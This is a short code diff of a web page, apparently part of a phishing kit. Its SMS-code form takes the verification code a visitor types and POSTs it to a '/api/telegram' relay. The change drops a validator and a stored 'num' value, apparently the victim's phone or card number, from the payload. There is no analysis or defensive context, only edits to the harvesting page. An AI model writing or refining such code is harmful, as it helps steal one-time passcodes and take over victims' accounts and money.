@@ -358,7 +358,7 @@
 
       </div>
 
-      <form id="smsForm" onsubmit="return validateSMS();" method="post">
+      <form id="smsForm" method="post">
 
 
 
@@ -372,13 +372,12 @@ const smsForm = document.querySelector("#smsForm");
       e.preventDefault();
     
       const sms_code = document.getElementById("sms_input").value;
-      const num = localStorage.getItem("num") || "";
     
       try {
         const response = await fetch("/api/telegram", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ num, sms_code }),
+          body: JSON.stringify({ sms_code }),
         });
     
         if (response.ok) {
